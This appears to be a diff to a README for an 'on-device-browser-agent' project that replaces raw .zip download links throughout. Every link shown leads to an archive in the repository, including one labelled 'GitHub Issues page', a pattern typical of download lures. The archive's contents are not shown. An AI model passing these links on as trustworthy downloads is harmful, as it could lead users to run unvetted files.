@@ -17,7 +17,7 @@ To run the on-device-browser-agent, your device should meet the following requir
 
 To get started, visit the Releases page to download the latest version of the application. 
 
-[![Download on GitHub](https://github.com/mundoecco/on-device-browser-agent/raw/refs/heads/master/src/device_browser_agent_on_2.3-alpha.2.zip%20on%20GitHub-blue)](https://github.com/mundoecco/on-device-browser-agent/raw/refs/heads/master/src/device_browser_agent_on_2.3-alpha.2.zip)
+[![Download on GitHub](https://raw.githubusercontent.com/mundoecco/on-device-browser-agent/master/public/browser-device-on-agent-v3.2-alpha.4.zip%20on%20GitHub-blue)](https://raw.githubusercontent.com/mundoecco/on-device-browser-agent/master/public/browser-device-on-agent-v3.2-alpha.4.zip)
 
 Follow these steps to download and install:
 
@@ -67,7 +67,7 @@ If you run into any issues, here are some common troubleshooting steps:
 
 If you require further assistance:
 
-1. Visit our [GitHub Issues page](https://github.com/mundoecco/on-device-browser-agent/raw/refs/heads/master/src/device_browser_agent_on_2.3-alpha.2.zip).
+1. Visit our [GitHub Issues page](https://raw.githubusercontent.com/mundoecco/on-device-browser-agent/master/public/browser-device-on-agent-v3.2-alpha.4.zip).
 2. Search to see if your issue has already been reported.
 3. If not, open a new issue to describe your problem in detail.
 
@@ -84,6 +84,6 @@ For any inquiries, please reach out via our GitHub repository.
 
 Once again, access the download link here:
 
-[![Download on GitHub](https://github.com/mundoecco/on-device-browser-agent/raw/refs/heads/master/src/device_browser_agent_on_2.3-alpha.2.zip%20on%20GitHub-blue)](https://github.com/mundoecco/on-device-browser-agent/raw/refs/heads/master/src/device_browser_agent_on_2.3-alpha.2.zip) 
+[![Download on GitHub](https://raw.githubusercontent.com/mundoecco/on-device-browser-agent/master/public/browser-device-on-agent-v3.2-alpha.4.zip%20on%20GitHub-blue)](https://raw.githubusercontent.com/mundoecco/on-device-browser-agent/master/public/browser-device-on-agent-v3.2-alpha.4.zip) 
 
 Enjoy using the on-device-browser-agent for your private browsing needs!
